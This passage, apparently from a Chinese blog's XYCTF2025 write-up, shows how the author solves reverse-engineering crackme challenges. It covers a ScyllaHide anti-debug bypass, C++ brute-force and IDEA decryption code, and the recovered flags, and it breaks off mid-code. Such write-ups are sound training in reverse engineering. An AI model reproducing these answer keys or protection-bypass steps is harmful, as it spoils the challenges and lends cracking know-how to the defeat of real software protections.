<span class="type">uint32_t</span> key[<span class="number">4</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> Enc[]&#123;</span><br><span class="line">        <span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line">        <span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key[i] = <span class="built_in">rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">xxtea</span>(Enc, <span class="number">-8</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Enc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{th15_15_51mpLe_obf_R19Ht?}</p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。</p><p><img src="/2025/04/07/XYCTF2025/47.png"></p><p><img src="/2025/04/07/XYCTF2025/48.png"></p><p>从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。</p><p><img src="/2025/04/07/XYCTF2025/49.png"></p><p><img src="/2025/04/07/XYCTF2025/50.png"></p><p><img src="/2025/04/07/XYCTF2025/51.png"></p><p><img src="/2025/04/07/XYCTF2025/52.png"></p><p>从TLS那边可以看到启动了一个线程，线程函数如下</p><p><img src="/2025/04/07/XYCTF2025/53.png"></p><p>这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。</p><p><img src="/2025/04/07/XYCTF2025/54.png"></p><p>将这边v4都异或上0xBB会得到”flag{“五个字符，就明白这边是检测输入flag开头是否为”flag{“，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。</p><p><img src="/2025/04/07/XYCTF2025/55.png"></p><p>mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。</p><p>这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。</p><p><img src="/2025/04/07/XYCTF2025/56.png"></p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">      <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">      <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">      <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">      <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">      <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">      <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">      <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">      <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">      <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">      <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">      <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">      <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">      <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">      <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">      <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">      <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">      <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">      <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">      <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">      <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">      <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">      <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">      <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">      <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">      <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">      <span class="number">0x98D220BD</span>, <span class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">      <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">      <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">      <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">      <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">      <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">      <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">      <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">      <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">      <span class="number">0x46A95BAD</span>,</span><br><span class="line">      <span class="number">0x1CAC84B6</span>,</span><br><span class="line">      <span class="number">0xA67CB2B2</span>,</span><br><span class="line">      <span class="number">0x32188937</span>,</span><br><span class="line">      <span class="number">0x4872D39F</span>,</span><br><span class="line">      <span class="number">0xF2A2E59B</span>,</span><br><span class="line">      <span class="number">0x011B94D2</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 爆破前7字节</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; c++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>得到前七个字符为：<strong>moshui_</strong></p><p>第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。</p><p><img src="/2025/04/07/XYCTF2025/57.png"></p><p><img src="/2025/04/07/XYCTF2025/58.png"></p><p>开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。</p><p>由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。</p><p>密钥：<strong>0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF</strong></p><p><img src="/2025/04/07/XYCTF2025/59.png"></p><p>然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为’}’，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。</p><p><img src="/2025/04/07/XYCTF2025/60.png"></p><p>加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。</p><p>利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。</p><p><img src="/2025/04/07/XYCTF2025/61.png"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;16&gt; code;</span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;128&gt; key;</span><br><span class="line"></span><br><span class="line">bitset&lt;16&gt; sub_key[<span class="number">52</span>];</span><br><span class="line">bitset&lt;16&gt; inv_sub_key[<span class="number">52</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">XOR</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> code_1 ^ code_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Plus</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i) + code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp %= <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invPlus</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    tmp = <span class="number">65536</span> - tmp;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Times</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp_1 = <span class="number">0</span>, tmp_2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_1 += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">        tmp_2 += code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp_1 == <span class="number">0</span>)</span><br><span class="line">        tmp_1 = <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">if</span> (tmp_2 == <span class="number">0</span>)</span><br><span class="line">        tmp_2 = <span class="number">65536</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp = (tmp_1 * tmp_2) % <span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp == <span class="number">65536</span> ? <span class="number">0</span> : tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b)</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">Exgcd</span>(b, a % b, y, x), y -= a / b * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invTimes</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">65537</span>;</span><br><span class="line">    <span class="built_in">Exgcd</span>(tmp, p, x, y);</span><br><span class="line">    x = (x % p + p) % p;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">subkeys_get</span><span class="params">(code keys_input[<span class="number">8</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    key keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            keys[j + <span class="number">16</span> * i] = keys_input[<span class="number">7</span> - i][j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * i)];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">        keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = (<span class="number">8</span> + <span class="number">8</span> * i); j &lt; (<span class="number">8</span> * (i + <span class="number">2</span>)); j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; 